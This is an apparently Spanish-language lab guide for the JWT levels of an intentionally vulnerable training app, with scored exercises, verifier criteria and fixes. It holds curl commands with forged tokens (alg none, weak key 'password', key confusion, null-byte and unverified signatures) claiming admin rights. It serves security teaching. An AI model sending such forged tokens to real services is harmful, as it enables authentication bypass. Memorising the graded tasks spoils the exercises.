#### `GET /VulnerableApp/JWTVulnerability/LEVEL_3`

**Entrada:** {
  "query": [
    "fetch=true para generar un token; sin fetch se lee Cookie: JWT=<token>"
  ],
  "headers": [
    "Cookie: JWT=<token>"
  ]
}

Igual que LEVEL_2, pero añade el atributo textual httponly al Set-Cookie; no añade Secure.

CLIENT_SIDE_VULNERABLE_JWT / COOKIE_WITH_HTTPONLY_WITHOUT_SECURE_FLAG_BASED_JWT_VULNERABILITY. La comparación de cabeceras con LEVEL_2 es el control natural: aparece HttpOnly, pero sigue faltando Secure.

#### `GET /VulnerableApp/JWTVulnerability/LEVEL_4`

**Entrada:** {
  "query": [
    "fetch=true para generar un token con clave LOW; sin fetch se lee Cookie: JWT=<token>"
  ],
  "headers": [
    "Cookie: JWT=<token>"
  ]
}

Usa customHMACValidator con HS256 y la clave LOW configurada como password; añade httponly, pero no Secure.

Combina CLIENT_SIDE_VULNERABLE_JWT por el cookie sin Secure con INSECURE_CONFIGURATION_JWT / COOKIE_BASED_LOW_KEY_STRENGTH_JWT_VULNERABILITY. El test firma el token de demostración con la clave LOW.

#### `GET /VulnerableApp/JWTVulnerability/LEVEL_5`

**Entrada:** {
  "query": [
    "fetch=true para generar; sin fetch se lee Cookie: JWT=<token>"
  ],
  "headers": [
    "Cookie: JWT=<token>"
  ]
}

Usa customHMACNullByteVulnerableValidator. Si la firma recibida contiene %00, corta el texto de firma antes de recalcular HS256; añade httponly, pero no Secure.

La constante NULL_BYTE_TOKEN de los tests termina la firma válida con %00extra y es aceptada por este nivel. El mismo valor enviado a LEVEL_17 debe ser rechazado. No se usa ningún comando del sistema: %00 solo es parte del texto del token.

#### `GET /VulnerableApp/JWTVulnerability/LEVEL_6`

**Entrada:** {
  "query": [
    "fetch=true para generar; sin fetch se lee Cookie: JWT=<token>"
  ],
  "headers": [
    "Cookie: JWT=<token>"
  ]
}

Usa customHMACNoneAlgorithmVulnerableValidator: si alg es none devuelve válido sin verificar firma; en otros casos cae al validador HMAC. Añade httponly, pero no Secure.

SERVER_SIDE_VULNERABLE_JWT / COOKIE_BASED_NONE_ALGORITHM_JWT_VULNERABILITY. El payload documental de attackvectors/JWTVulnerabilityPayload.properties usa un token sin firma; LEVEL_17 lo rechaza.

#### `GET /VulnerableApp/JWTVulnerability/LEVEL_7`

**Entrada:** {
  "query": [
    "fetch=true para generar; sin fetch se lee una o más cabeceras Authorization"
  ],
  "headers": [
    "Authorization: <token>"
  ]
}

Aunque la anotación describe cookie, el método consume Authorization. Usa el validador none vulnerable y devuelve/eco la cabecera Authorization recibida; fetch genera un token HS256 HIGH y lo devuelve en esa cabecera.

Es un caso especial para scanners que normalmente no tocan Authorization. El código no elimina prefijo Bearer en este nivel y no exige una sola cabecera.

#### `GET /VulnerableApp/JWTVulnerability/LEVEL_8`

**Entrada:** {
  "query": [
    "fetch=true para generar; sin fetch se lee Cookie: JWT=<token>"
  ],
  "headers": [
    "Cookie: JWT=<token>"
  ]
}

Obtiene la clave pública RSA del KMS y llama a confusionAlgorithmVulnerableValidator, que lee alg del token y puede tratar esa clave pública como secreto HMAC. Añade httponly, pero no Secure.

SERVER_SIDE_VULNERABLE_JWT / COOKIE_BASED_KEY_CONFUSION_JWT_VULNERABILITY. KEY_CONFUSION_TOKEN de los tests es un HS256 firmado con la representación de la clave pública y se acepta aquí; no se ejecuta ningún proceso externo.

#### `GET /VulnerableApp/JWTVulnerability/LEVEL_9`

**Entrada:** {
  "query": [
    "fetch=true para generar; sin fetch se lee Cookie: JWT=<token>"
  ],
  "headers": [
    "Cookie: JWT=<token>"
  ]
}

Usa jwkKeyHeaderPublicKeyTrustingVulnerableValidator: si alg es asimétrico, construye el verificador desde el objeto jwk que viene en el encabezado JWT. Añade httponly, pero no Secure.

SERVER_SIDE_VULNERABLE_JWT / COOKIE_BASED_FOR_JWK_HEADER_BASED_JWT_VULNERABILITY, relacionado con CVE-2018-0114. El test crea un token con un par RSA atacante en memoria; curl por sí solo puede repetir el token generado por fetch, pero no firma un JWK atacante sin una herramienta criptográfica adicional.

#### `GET /VulnerableApp/JWTVulnerability/LEVEL_10`

**Entrada:** {
  "query": [
    "fetch=true para generar; sin fetch se lee Cookie: JWT=<token>"
  ],
  "headers": [
    "Cookie: JWT=<token>"
  ]
}

Usa customHMACEmptyTokenVulnerableValidator, que considera válido un token cuya separación por puntos no produce partes; en la práctica los tests usan .. y el método acepta ese caso. Añade httponly, pero no Secure.

SERVER_SIDE_VULNERABLE_JWT / COOKIE_BASED_EMPTY_TOKEN_JWT_VULNERABILITY. El test comprueba que EMPTY_TOKEN=.. es aceptado por este nivel y rechazado por los seguros.

#### `GET /VulnerableApp/JWTVulnerability/LEVEL_11`

**Entrada:** {
  "query": [
    "Ninguno aplicable: no hay mapping activo"
  ],
  "headers": []
}

El método getVulnerablePayloadLevelUnsecure11CookieBased existe en la clase y usa PEM estáticos para genericJWTTokenValidator RS256, pero la anotación @VulnerableAppRequestMapping está comentada; el controlador de endpoints no lo registra.

No es una ruta reproducible en el despliegue anotado. Se documenta para no confundir código legado con un endpoint activo; no debe evaluarse con curl como si existiera.

#### `GET /VulnerableApp/JWTVulnerability/LEVEL_12`

**Entrada:** {
  "query": [
    "Ninguno: no existe método/anotación LEVEL_12 en esta familia"
  ],
  "headers": []
}

No hay implementación ni @VulnerableAppRequestMapping para LEVEL_12 en JWTVulnerability.java.

La ausencia es intencionalmente informativa para la enumeración: un 404 en esta ruta sería coherente con el código revisado y no es evidencia de una vulnerabilidad JWT.

#### `GET /VulnerableApp/JWTVulnerability/LEVEL_13`

**Entrada:** {
  "query": [
    "fetch=true para generar; sin fetch se lee Cookie: JWT=<token>"
  ],
  "headers": [
    "Cookie: JWT=<token>"
  ]
}

Está anotado como HEADER_INJECTION. Lee cookie JWT, valida con el verificador que confía en jwk y construye Set-Cookie concatenando el valor recibido con ; httponly. fetch genera un token RSA con JWK en su cabecera.

No se envía CRLF ni ningún payload de inyección en el ejercicio: la verificación segura se limita a observar el flujo con un token legítimo de fetch. El riesgo de construir una cabecera con entrada recibida se determina por revisión de código; el comportamiento efectivo puede depender del contenedor HTTP.

#### `GET /VulnerableApp/JWTVulnerability/LEVEL_14`

**Entrada:** {
  "query": [
    "fetch=true para generar; sin fetch se lee Cookie: JWT=<token>"
  ],
  "headers": [
    "Cookie: JWT=<token>"
  ]
}

Usa HMAC HS256 con la clave LOW password y el validador normal; añade httponly, pero no Secure.

INSECURE_CONFIGURATION_JWT / COOKIE_BASED_VERY_WEAK_KEY_STRENGTH_JWT_VULNERABILITY. Es un duplicado deliberado del uso de clave débil de LEVEL_4 con tarjeta propia; WEAK_KEY_TOKEN de los tests es el control positivo seguro para laboratorio.

#### `GET /VulnerableApp/JWTVulnerability/LEVEL_15`

**Entrada:** {
  "query": [
    "fetch=true para generar; sin fetch se lee Cookie: JWT=<token>"
  ],
  "headers": [
    "Cookie: JWT=<token>"
  ]
}

No verifica la firma. Para un cookie que contiene tres partes separadas por punto devuelve isValid=true, sin llamar a un validador criptográfico; fetch solo genera un token de referencia.

SERVER_SIDE_VULNERABLE_JWT / COOKIE_BASED_MISSING_SIGNATURE_VERIFICATION_JWT_VULNERABILITY. UNVERIFIED_SIGNATURE_TOKEN con firma textual garbage-not-a-real-signature es aceptado aquí y rechazado por LEVEL_17.

#### `GET /VulnerableApp/JWTVulnerability/LEVEL_16`

**Entrada:** {
  "query": [
    "fetch=true para generar; sin fetch se lee Cookie: JWT=<token>"
  ],
  "headers": [
    "Cookie: JWT=<token>"
  ]
}

Ignora el alg declarado al verificar y siempre recalcula HMAC con HS256 y la clave HIGH. El test HS384_HEADER_TOKEN tiene cabecera alg HS384 pero firma compatible con el cálculo HS256 que usa el código.

INSECURE_CONFIGURATION_JWT / COOKIE_BASED_ALGORITHM_DOWNGRADE_JWT_VULNERABILITY. LEVEL_17 fija HS256 y rechaza el encabezado HS384, por lo que sirve de control negativo.

#### `GET /VulnerableApp/JWTVulnerability/LEVEL_17`

**Entrada:** {
  "query": [
    "fetch=true para recibir un token de la instancia; sin fetch se valida una sola Authorization"
  ],
  "headers": [
    "Authorization: <token> o Bearer <token>"
  ]
}

Variante segura. Genera un HMAC key aleatorio de 32 bytes por instancia, fija HS256, usa SignedJWT/MACVerifier y acepta como máximo una cabecera Authorization, con prefijo Bearer opcional sin distinguir mayúsculas. En fallo devuelve 401 y content null sin reflejar el token.

El marcado Variant.SECURE y los tests prueban tokens bound a la instancia, rechazo de none, clave débil, byte nulo, token vacío, firma no verificada, HS384, cabecera repetida y tokens firmados con la clave publicada.

#### `GET /VulnerableApp/JWTVulnerability/LEVEL_18`

**Entrada:** {
  "query": [
    "fetch=true para recibir un token RSA de la instancia; sin fetch se valida una sola Authorization"
  ],
  "headers": [
    "Authorization: <token> o Bearer <token>"
  ]
}

Variante segura. Genera un par RSA de 2048 bits aleatorio por instancia, fija RS256 y verifica con su propia clave pública; ignora claves jwk del token y no usa la clave PKCS12 del KMS. No refleja Authorization.

Los tests prueban rechazo de confusión HS/RSA, JWK de atacante, otra clave RSA, none, tokens malformados, algoritmos alternativos y la clave RSA publicada por KMS.

#### `GET /VulnerableApp/JWTVulnerability/LEVEL_19`

**Entrada:** {
  "query": [
    "fetch=true para recibir un token EC de la instancia; sin fetch se valida una sola Authorization"
  ],
  "headers": [
    "Authorization: <token> o Bearer <token>"
  ]
}

Variante segura. Genera un par EC P-256 aleatorio por instancia, fija ES256 y verifica con ECDSAVerifier; rechaza JWK de atacante, ES384, tokens de otros niveles, malformados y cabeceras ausentes o repetidas.

SecureECJWTTest confirma que solo la cabecera Authorization es aceptada; un parámetro query jwt no participa. La clave cambia al crear otra instancia.

### jwt-01 · LEVEL_1: exposición del JWT en la URL frente a validación normal

La primera petición sin JWT genera 200 y entrega un token en content. Reenviarlo como query JWT produce 200/isValid=true; añadir un carácter al token debe producir 401/isValid=false y el código fuente prevé que lo refleje en content.

**Puntaje:** 0 XP. Práctica guiada sin puntaje automático.

La plantilla LEVEL_1.js concatena el valor en la URL y el método acepta @RequestParam Map. La firma se valida con la clave HIGH, pero el transporte expone el token a URL, historial, proxies y logs.

```bash
curl -i --get http://target:9090/VulnerableApp/JWTVulnerability/LEVEL_1
```

Copiar el campo content del JSON anterior y sustituirlo literalmente en TOKEN_HS256_HIGH.

```bash
curl -i --get http://target:9090/VulnerableApp/JWTVulnerability/LEVEL_1 --data-urlencode 'JWT=<TOKEN_HS256_HIGH>'
```

```bash
curl -i --get http://target:9090/VulnerableApp/JWTVulnerability/LEVEL_1 --data-urlencode 'JWT=<TOKEN_HS256_HIGH_MODIFICADO>'
```

**Criterio del verificador:**

```json
{
  "kind": "manual",
  "value": "Adquirir y validar el token de la misma instancia según los comandos; fetch por sí solo no acredita el objetivo."
}
```

**Pistas:**

El token de la primera respuesta es una credencial de laboratorio, no lo compartas fuera del entorno.

Un 200 solo demuestra el resultado que expresa este endpoint; no demuestra una sesión real ni autorización de negocio.

**Corrección recomendada:** No poner credenciales o JWT en query strings; usar una cabecera Authorization o cookie HttpOnly/Secure/SameSite con política de expiración, y no reflejar tokens inválidos en la respuesta.

### jwt-02 · LEVEL_2: cookie JWT sin atributos de seguridad

200 con content y una cabecera Set-Cookie que contiene JWT=; la rama fetch del código no añade HttpOnly ni Secure.

**Puntaje:** 0 XP. Práctica guiada sin puntaje automático.

El token se mantiene en una cookie, pero el método construye Set-Cookie con solo JWT=<token>. El ejercicio no necesita ejecutar JavaScript ni extraer cookies.

```bash
curl -i --get http://target:9090/VulnerableApp/JWTVulnerability/LEVEL_2 --data-urlencode 'fetch=true'
```

Guardar el valor JWT recibido en Set-Cookie solo para la siguiente petición de laboratorio.

```bash
curl -i http://target:9090/VulnerableApp/JWTVulnerability/LEVEL_2 -H 'Cookie: JWT=<TOKEN_DEL_SET_COOKIE>'
```

**Criterio del verificador:**

```json
{
  "kind": "manual",
  "value": "Inspeccionar Set-Cookie: debe contener JWT= y, según el código, no debe contener HttpOnly ni Secure"
}
```

**Pistas:**

El segundo comando es una comprobación funcional de la cookie; el primer encabezado es la evidencia de configuración.

No puntuar por hacer click en la UI: revisar la cabecera HTTP.

**Corrección recomendada:** Emitir Secure; HttpOnly; SameSite=Lax/Strict según el caso, limitar Path/Domain y aplicar expiración y rotación.

### jwt-03 · LEVEL_3: HttpOnly presente pero Secure ausente

200 con Set-Cookie JWT=<token>; httponly y sin Secure. Es el control comparativo de LEVEL_2.

**Puntaje:** 100 XP. Evidencia observada por el runner de Kali.

El código añade la cadena httponly tanto en fetch como al reemitir una cookie, pero nunca añade Secure.

```bash
curl -i --get http://target:9090/VulnerableApp/JWTVulnerability/LEVEL_3 --data-urlencode 'fetch=true'
```

```bash
curl -i --get http://target:9090/VulnerableApp/JWTVulnerability/LEVEL_2 --data-urlencode 'fetch=true'
```

Comparar ambas líneas Set-Cookie: LEVEL_3 debe contener httponly; ninguna de las dos ramas fuente añade Secure.

Registrar la misma prueba con el cliente del laboratorio:
lab request jwt-03 --method GET --param fetch=true

**Criterio del verificador:**

```json
{
  "kind": "header_contains",
  "header": "Set-Cookie",
  "value": "httponly"
}
```

**Pistas:**

header comprueba presencia, no ausencia; la ausencia de Secure se revisa manualmente en la línea completa.

No interpretar que HttpOnly evita CSRF o que la presencia de una cookie prueba autenticación de negocio.

**Corrección recomendada:** Mantener HttpOnly y añadir Secure en despliegues HTTPS; configurar SameSite y evitar aceptar cookies de transporte inseguro.

### jwt-04 · LEVEL_4: clave HMAC LOW reproducible en laboratorio

El token de tarjeta firmado con la clave LOW password debe seguir el camino válido (200/isValid=true); el mismo valor en LEVEL_17 debe ser 401, porque la clave segura es aleatoria por instancia.

**Puntaje:** 100 XP. Evidencia observada por el runner de Kali.

SymmetricAlgoKeys.json contiene literalmente la clave LOW password y el nivel la usa para verificar HS256. El valor es un token de entrenamiento estático, no una instrucción de cracking.

```bash
curl -i http://target:9090/VulnerableApp/JWTVulnerability/LEVEL_4 -H 'Cookie: JWT=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhdHRhY2tlciIsImFkbWluIjp0cnVlfQ.-d0dKlq4zHY09jm50snO-JOwUuaBj8IxyGix5xFXa8s'
```

```bash
curl -i http://target:9090/VulnerableApp/JWTVulnerability/LEVEL_17 -H 'Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhdHRhY2tlciIsImFkbWluIjp0cnVlfQ.-d0dKlq4zHY09jm50snO-JOwUuaBj8IxyGix5xFXa8s'
```

Registrar la misma prueba con el cliente del laboratorio:
lab request jwt-04 --method GET --header Cookie=JWT=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhdHRhY2tlciIsImFkbWluIjp0cnVlfQ.-d0dKlq4zHY09jm50snO-JOwUuaBj8IxyGix5xFXa8s

**Criterio del verificador:**

```json
{
  "kind": "json",
  "path": "isValid",
  "value": true
}
```

**Pistas:**

El primer token es la constante WEAK_KEY_TOKEN de los tests.

El segundo comando es un control negativo entre niveles, no una prueba de que exista autorización de negocio.

**Corrección recomendada:** Usar secretos aleatorios de alta entropía gestionados fuera del código, rotarlos y no compartir claves entre validadores vulnerables y seguros.

### jwt-05 · LEVEL_5: byte nulo codificado en la firma

El token NULL_BYTE_TOKEN de los tests debe ser aceptado por LEVEL_5 (200/isValid=true). El mismo texto en Authorization de LEVEL_17 debe ser rechazado.

**Puntaje:** 100 XP. Evidencia observada por el runner de Kali.

El validador vulnerable busca %00 mediante URLEncoder y corta la parte posterior antes de recalcular la firma. curl solo transporta el marcador textual %00; no se ejecuta ni se escribe nada.

```bash
curl -i http://target:9090/VulnerableApp/JWTVulnerability/LEVEL_5 -H 'Cookie: JWT=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.MZiW2KkIRI6GhKsu16Me7-3IpS4nBw1W47CW67QAqS0%00extra'
```

```bash
curl -i http://target:9090/VulnerableApp/JWTVulnerability/LEVEL_17 -H 'Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.MZiW2KkIRI6GhKsu16Me7-3IpS4nBw1W47CW67QAqS0%00extra'
```

Registrar la misma prueba con el cliente del laboratorio:
lab request jwt-05 --method GET --header Cookie=JWT=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.MZiW2KkIRI6GhKsu16Me7-3IpS4nBw1W47CW67QAqS0%00extra

**Criterio del verificador:**

```json
{
  "kind": "json",
  "path": "isValid",
  "value": true
}
```

**Pistas:**

No cambies %00 por un byte real en la terminal: la implementación busca la representación URL-encoded %00.

El control positivo solo demuestra la diferencia entre dos validadores del laboratorio.

**Corrección recomendada:** Parsear JWT con una biblioteca que rechace entradas no canónicas, verificar la firma sobre el token exacto recibido y comparar la firma de forma constante; no emular terminación de cadenas C.

### jwt-06 · LEVEL_6: algoritmo none sin firma

NONE_ALGORITHM_TOKEN debe producir 200/isValid=true en LEVEL_6, mientras el mismo token en LEVEL_17 debe producir 401/isValid=false.

**Puntaje:** 100 XP. Evidencia observada por el runner de Kali.

customHMACNoneAlgorithmVulnerableValidator devuelve true cuando alg es none antes de comprobar la firma. El payload se limita a claims de prueba y no accede a ningún recurso.

```bash
curl -i http://target:9090/VulnerableApp/JWTVulnerability/LEVEL_6 -H 'Cookie: JWT=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhdHRhY2tlciIsImFkbWluIjp0cnVlfQ.'
```

```bash
curl -i http://target:9090/VulnerableApp/JWTVulnerability/LEVEL_17 -H 'Authorization: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhdHRhY2tlciIsImFkbWluIjp0cnVlfQ.'
```

Registrar la misma prueba con el cliente del laboratorio:
lab request jwt-06 --method GET --header Cookie=JWT=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhdHRhY2tlciIsImFkbWluIjp0cnVlfQ.

**Criterio del verificador:**

```json
{
  "kind": "json",
  "path": "isValid",
  "value": true
}
```

**Pistas:**

El punto final final es intencional: el JWT none no tiene firma.

El segundo 401 es el control positivo de la defensa, no una promesa sobre otros componentes de la aplicación.

**Corrección recomendada:** Permitir únicamente algoritmos configurados por servidor, exigir firma no vacía y comprobar algoritmo, clave y firma antes de aceptar claims.

### jwt-07 · LEVEL_7: token none en Authorization y eco de cabecera

El nivel especial para scanners consume Authorization, acepta el token none y devuelve una cabecera Authorization con el valor recibido; LEVEL_17 debe rechazarlo y no reflejarlo.

**Puntaje:** 100 XP. Evidencia observada por el runner de Kali.

La anotación conserva una descripción de cookie, pero el código obtiene requestEntity.getHeaders().get(HttpHeaders.AUTHORIZATION). No añade ni quita Bearer en esta rama.

```bash
curl -i http://target:9090/VulnerableApp/JWTVulnerability/LEVEL_7 -H 'Authorization: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhdHRhY2tlciIsImFkbWluIjp0cnVlfQ.'
```

```bash
curl -i http://target:9090/VulnerableApp/JWTVulnerability/LEVEL_17 -H 'Authorization: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhdHRhY2tlciIsImFkbWluIjp0cnVlfQ.'
```

Registrar la misma prueba con el cliente del laboratorio:
lab request jwt-07 --method GET --header Authorization=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhdHRhY2tlciIsImFkbWluIjp0cnVlfQ.

**Criterio del verificador:**

```json
{
  "kind": "header",
  "header": "Authorization",
  "value": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhdHRhY2tlciIsImFkbWluIjp0cnVlfQ."
}
```

**Pistas:**

Usar -i permite observar la respuesta y la posible cabecera Authorization.

La presencia de una cabecera reflejada es evidencia de eco, no prueba de ejecución XSS ni de una sesión válida fuera de este endpoint.

**Corrección recomendada:** No devolver credenciales en cabeceras de respuesta, validar Authorization con algoritmo fijo y rechazar none; aplicar una política de una sola cabecera.

### jwt-08 · LEVEL_8: confusión de algoritmo con clave pública

KEY_CONFUSION_TOKEN debe ser aceptado por LEVEL_8 (200/isValid=true). El control de la misma cadena en Authorization de LEVEL_18 debe ser 401.

**Puntaje:** 100 XP. Evidencia observada por el runner de Kali.

El validador lee alg del encabezado y genericJWTTokenValidator usa la clave pública como bytes HMAC cuando alg empieza por HS. El token de test es una cadena estática y no ejecuta código.

```bash
curl -i http://target:9090/VulnerableApp/JWTVulnerability/LEVEL_8 -H 'Cookie: JWT=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhdHRhY2tlciIsImFkbWluIjp0cnVlfQ.an2AXi8z3uCi71XWiIXA-4T5DMNoy2uqh9sr7WEI238'
```

```bash
curl -i http://target:9090/VulnerableApp/JWTVulnerability/LEVEL_18 -H 'Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhdHRhY2tlciIsImFkbWluIjp0cnVlfQ.an2AXi8z3uCi71XWiIXA-4T5DMNoy2uqh9sr7WEI238'
```

Registrar la misma prueba con el cliente del laboratorio:
lab request jwt-08 --method GET --header Cookie=JWT=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhdHRhY2tlciIsImFkbWluIjp0cnVlfQ.an2AXi8z3uCi71XWiIXA-4T5DMNoy2uqh9sr7WEI238

**Criterio del verificador:**

```json
{
  "kind": "json",
  "path": "isValid",
  "value": true
}
```

**Pistas:**

El primer transporte es Cookie y el control seguro usa Authorization porque los niveles seguros no consumen cookies.

No interpretar un 200 como IDOR: aquí solo se observa el resultado del verificador JWT.

**Corrección recomendada:** Separar rutas de verificación simétrica y asimétrica, fijar RS256 en el servidor y usar una clave privada para firmar; jamás convertir una clave pública en secreto HMAC.

### jwt-09 · LEVEL_9: confianza en JWK suministrado en el encabezado

fetch=true debe generar un JWT RSA con objeto jwk en su encabezado, devolverlo en content y emitir Set-Cookie; repetir ese token en Cookie debe seguir el camino válido. Esto es una reproducción funcional, no una falsificación con clave atacante.

**Puntaje:** 0 XP. Práctica guiada sin puntaje automático.

El token de fetch es firmado por el propio par RSA del KMS, por lo que sirve como baseline. La vulnerabilidad de código aparece porque el verificador obtiene la clave pública del JWK del token; crear un JWK atacante requiere firmar un JWT y no se fuerza aquí con un comando peligroso.

```bash
curl -i --get http://target:9090/VulnerableApp/JWTVulnerability/LEVEL_9 --data-urlencode 'fetch=true'
```

Comprobar manualmente que el primer segmento decodificado del content contiene jwk; no alterar el token.

```bash
curl -i http://target:9090/VulnerableApp/JWTVulnerability/LEVEL_9 -H 'Cookie: JWT=<TOKEN_RSA_CON_JWK_DEL_CONTENT>'
```

```bash
curl -i http://target:9090/VulnerableApp/JWTVulnerability/LEVEL_18 -H 'Authorization: <TOKEN_RSA_CON_JWK_DEL_CONTENT>'
```

**Criterio del verificador:**

```json
{
  "kind": "manual",
  "value": "Adquirir y validar el token de la misma instancia según los comandos; fetch por sí solo no acredita el objetivo."
}
```

**Pistas:**

La última petición es control negativo: LEVEL_18 usa una clave RSA aleatoria de su instancia y no confía en el JWK.

La aceptación de un token legítimo generado por servidor no demuestra por sí sola la explotación con una clave atacante; esa incertidumbre queda explícita.

**Corrección recomendada:** Ignorar jwk/jku suministrados por el cliente y seleccionar una clave pública de confianza por configuración o kid validado contra un almacén permitido.

### jwt-10 · LEVEL_10: token vacío estructuralmente aceptado

El valor exacto .. debe ser considerado válido por LEVEL_10 (200/isValid=true) aunque no contiene un JWT firmado; LEVEL_17 debe devolver 401.

**Puntaje:** 100 XP. Evidencia observada por el runner de Kali.

customHMACEmptyTokenVulnerableValidator usa split sin límite y trata un arreglo vacío como válido; el test documenta .. como EMPTY_TOKEN.

```bash
curl -i http://target:9090/VulnerableApp/JWTVulnerability/LEVEL_10 -H 'Cookie: JWT=..'
```

```bash
curl -i http://target:9090/VulnerableApp/JWTVulnerability/LEVEL_17 -H 'Authorization: ..'
```

Registrar la misma prueba con el cliente del laboratorio:
lab request jwt-10 --method GET --header Cookie=JWT=..

**Criterio del verificador:**

```json
{
  "kind": "json",
  "path": "isValid",
  "value": true
}
```

**Pistas:**

No agregues payloads ni solicitudes repetidas; una sola petición basta.

Un 401 en el control seguro muestra rechazo del formato en ese validador, no una garantía universal para otros endpoints.

**Corrección recomendada:** Exigir exactamente tres segmentos Base64URL no vacíos, parsear encabezado y claims y verificar una firma compatible con algoritmo/clave fijados.

### jwt-11 · LEVEL_13: observar la reemisión Set-Cookie sin probar CRLF

fetch=true devuelve un token RSA con JWK y Set-Cookie; al repetirlo en Cookie el código valida usando el JWK y vuelve a construir Set-Cookie. No se intenta introducir saltos de línea.

**Puntaje:** 100 XP. Evidencia observada por el runner de Kali.

El vector está anotado HEADER_INJECTION porque el valor de cookie termina concatenado en una cabecera Set-Cookie. El laboratorio solo verifica la ruta legítima y deja la explotación de caracteres de control fuera del ejercicio seguro.

```bash
curl -i --get http://target:9090/VulnerableApp/JWTVulnerability/LEVEL_13 --data-urlencode 'fetch=true'
```

```bash
curl -i http://target:9090/VulnerableApp/JWTVulnerability/LEVEL_13 -H 'Cookie: JWT=<TOKEN_RSA_CON_JWK_DEL_CONTENT>'
```

Registrar la misma prueba con el cliente del laboratorio:
lab request jwt-11 --method GET --param fetch=true

**Criterio del verificador:**

```json
{
  "kind": "header_contains",
  "header": "Set-Cookie",
  "value": "JWT="
}
```

**Pistas:**

Usa solo el token de fetch y no intentes CRLF, codificaciones de salto de línea ni cabeceras adicionales.

header comprueba la presencia de Set-Cookie; no demuestra que un contenedor permita inyección de cabeceras.

**Corrección recomendada:** No concatenar entrada de cookie en cabeceras; usar APIs de cookie estructuradas que rechacen caracteres de control y validar el token antes de emitir cualquier respuesta.

### jwt-12 · LEVEL_14: clave muy débil y control con nivel seguro

WEAK_KEY_TOKEN debe producir 200/isValid=true en LEVEL_14; el mismo token como Authorization en LEVEL_17 debe producir 401.

**Puntaje:** 100 XP. Evidencia observada por el runner de Kali.

El método selecciona KeyStrength.LOW y usa la clave password. Se contrasta exactamente con la misma cadena en el nivel seguro, cuya clave no está publicada.

```bash
curl -i http://target:9090/VulnerableApp/JWTVulnerability/LEVEL_14 -H 'Cookie: JWT=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhdHRhY2tlciIsImFkbWluIjp0cnVlfQ.-d0dKlq4zHY09jm50snO-JOwUuaBj8IxyGix5xFXa8s'
```

```bash
curl -i http://target:9090/VulnerableApp/JWTVulnerability/LEVEL_17 -H 'Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhdHRhY2tlciIsImFkbWluIjp0cnVlfQ.-d0dKlq4zHY09jm50snO-JOwUuaBj8IxyGix5xFXa8s'
```

Registrar la misma prueba con el cliente del laboratorio:
lab request jwt-12 --method GET --header Cookie=JWT=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhdHRhY2tlciIsImFkbWluIjp0cnVlfQ.-d0dKlq4zHY09jm50snO-JOwUuaBj8IxyGix5xFXa8s

**Criterio del verificador:**

```json
{
  "kind": "json",
  "path": "isValid",
  "value": true
}
```

**Pistas:**

El token está tomado literalmente de JWTVulnerabilityTest y se limita a claims de entrenamiento.

No atribuir éxito a conocer una clave fuera de este laboratorio: la clave se incluye solo en el recurso de pruebas.

**Corrección recomendada:** Eliminar claves cortas o memorables, generar secretos aleatorios con longitud adecuada y mantener la clave fuera del repositorio y de las respuestas.

### jwt-13 · LEVEL_15: firma no verificada

El token con firma textual garbage-not-a-real-signature tiene tres segmentos y debe producir 200/isValid=true en LEVEL_15; LEVEL_17 debe devolver 401 y content null.

**Puntaje:** 100 XP. Evidencia observada por el runner de Kali.

El código comentado lo reconoce explícitamente: comprueba solo parts.length == 3 y no invoca verificación criptográfica.

```bash
curl -i http://target:9090/VulnerableApp/JWTVulnerability/LEVEL_15 -H 'Cookie: JWT=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhdHRhY2tlciIsImFkbWluIjp0cnVlfQ.garbage-not-a-real-signature'
```

```bash
curl -i http://target:9090/VulnerableApp/JWTVulnerability/LEVEL_17 -H 'Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhdHRhY2tlciIsImFkbWluIjp0cnVlfQ.garbage-not-a-real-signature'
```

Registrar la misma prueba con el cliente del laboratorio:
lab request jwt-13 --method GET --header Cookie=JWT=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhdHRhY2tlciIsImFkbWluIjp0cnVlfQ.garbage-not-a-real-signature

**Criterio del verificador:**

```json
{
  "kind": "json",
  "path": "isValid",
  "value": true
}
```

**Pistas:**

No cambies el payload: la prueba compara únicamente el criterio estructural del nivel.

Que el JSON diga isValid=true solo prueba la decisión de este endpoint; no implica acceso a una operación de negocio.

**Corrección recomendada:** Verificar la firma antes de leer claims privilegiados, fijar algoritmo y clave, y rechazar firmas ausentes, vacías o malformadas.

### jwt-14 · LEVEL_16: encabezado HS384 aceptado durante cálculo HS256

